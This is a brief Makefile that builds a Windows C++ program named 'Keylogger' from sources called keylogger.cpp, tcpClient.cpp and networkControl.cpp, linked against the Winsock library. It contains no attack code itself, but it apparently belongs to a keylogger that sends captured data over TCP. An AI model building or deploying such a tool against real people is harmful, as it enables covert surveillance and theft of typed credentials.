CXX = c++
CXXFLAGS = -Wall -std=c++17 -Iinclude
LDFLAGS = -lws2_32
TARGET = Keylogger

SRCS = src/keylogger.cpp src/tcpClient.cpp src/networkControl.cpp
OBJS = $(SRCS:.cpp=.o)

$(TARGET): $(OBJS)
	$(CXX) $(OBJS) -o $(TARGET) $(LDFLAGS)

%.o: %.cpp
	$(CXX) $(CXXFLAGS) -c $< -o $@

clean:
	del /Q src\*.o *.exe
